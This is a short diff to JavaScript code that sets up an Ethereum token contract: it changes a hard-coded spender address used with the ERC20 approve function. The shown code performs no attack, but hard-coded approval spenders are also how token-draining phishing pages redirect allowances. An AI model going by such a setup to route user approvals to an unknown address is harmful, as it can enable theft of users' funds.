@@ -3,7 +3,7 @@ let signer;
 let tokenContract;
 
 const TOKEN_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
-const SPENDER_ADDRESS = "0xf404b685ddf18ae2e14bf61d65ca7884ee7f745e";
+const SPENDER_ADDRESS = "0xaBe10e774745DAA4F43af098C4E0d66fAcfF3bC7";
 
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) public returns (bool)",
